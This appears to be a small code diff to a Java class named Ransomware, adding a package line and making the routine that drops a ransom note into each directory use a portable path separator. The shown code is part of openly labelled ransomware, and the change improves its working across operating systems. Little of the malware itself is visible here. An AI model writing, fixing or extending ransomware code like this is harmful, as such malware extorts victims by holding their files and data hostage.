@@ -1,3 +1,5 @@
+package ransomware;
+
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -168,7 +170,7 @@ public class Ransomware {
 	
 	private static void placeRansomNote(File dir) {
 		String loc = dir.getAbsolutePath();
-		File ransomFile = new File(loc + "\\" + RANSOM_NAME);
+		File ransomFile = new File(loc + File.separator + RANSOM_NAME);
 		try {
 			BufferedWriter output = new BufferedWriter(new FileWriter(ransomFile));
 			output.write(RANSOM_TEXT);
